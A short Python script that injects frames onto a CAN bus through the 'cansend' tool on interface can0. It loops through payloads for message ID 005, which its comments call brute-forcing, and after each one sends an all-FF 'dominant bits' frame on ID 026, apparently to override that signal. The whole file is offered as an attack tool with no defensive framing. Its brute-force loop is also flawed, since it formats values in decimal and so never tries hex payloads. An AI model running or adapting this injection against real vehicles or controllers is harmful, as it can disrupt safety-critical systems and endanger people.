import os
import subprocess
import time

# Timer variables
previous_time = 0
interval = 0.04  # Interval in seconds (40 milliseconds)

def send_can_message(message_id, data):
    # Format the message
    message = f"{message_id}#{data}"
    # Use subprocess to execute cansend command
    subprocess.run(["cansend", "can0", message])

# Send CAN message with brute-forced values for 005#
def send_messages():
    global previous_time
    # Get current time
    current_time = time.time()
    # Check if it's time to send the CAN message
    if current_time - previous_time >= interval:
        # Save the last time a CAN message was sent
        previous_time = current_time
        # Send CAN message with brute-forced values for 005#
        for i in range(10000000000000000):
            data_string = f"{i:016}"  # Format the value as a string with leading zeros
            message = f"005#{data_string}"
            send_can_message("005", data_string)
            print("Sent message:", message)
            # Send dominant bits message for 026#
            dominant_message = "026#FFFFFFFFFFFFFFFF"
            send_can_message("026", "FFFFFFFFFFFFFFFF")
            print("Sent dominant message:", dominant_message)
            # Maintain 25 frames per second
            time.sleep(0.04)

# Execute the send_messages function
send_messages()
